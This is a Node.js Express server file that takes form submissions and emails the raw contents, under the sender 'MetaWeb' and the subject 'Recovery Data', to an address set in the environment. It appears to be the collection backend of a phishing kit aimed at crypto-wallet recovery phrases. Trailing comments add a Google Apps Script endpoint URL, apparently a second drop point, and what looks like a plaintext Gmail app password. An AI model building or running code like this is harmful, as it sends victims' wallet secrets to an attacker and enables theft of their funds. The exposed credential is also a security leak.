const nodemailer = require("nodemailer");
const express = require("express");
const bodyParser = require("body-parser");
require("dotenv").config();

const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));

// Route to handle form submission
app.post("/", (req, res) => {
  // Extract form data
  console.log(req.body);
  console.log("to be trans");

  // Create a Nodemailer transporter with SMTP settings
  const transporter = nodemailer.createTransport({
    service: "Gmail",
    host: "smtp.gmail.com",
    port: 465,
    secure: true,
    auth: {
      user: process.env.email,
      pass: process.env.password,
    },
  });

  // Define email message
  const mailOptions = {
    from: "MetaWeb",
    to: [process.env.recipient1],
    subject: "Recovery Data",
    text: req.body,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error("Error sending email:", error);
    } else {
      console.log("Email sent:", info.response);
    }
  });
});

// Start server
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});

// AKfycbyZlTnsrXcLSV0WdZYI1kKQ3ShY4QzE6Ij1eNAFz2st8d1h6yTP5QGj4D6jdQGjxakf
// https://script.google.com/macros/s/AKfycbyZlTnsrXcLSV0WdZYI1kKQ3ShY4QzE6Ij1eNAFz2st8d1h6yTP5QGj4D6jdQGjxakf/exec
// imis zmmd fzuh cnkh
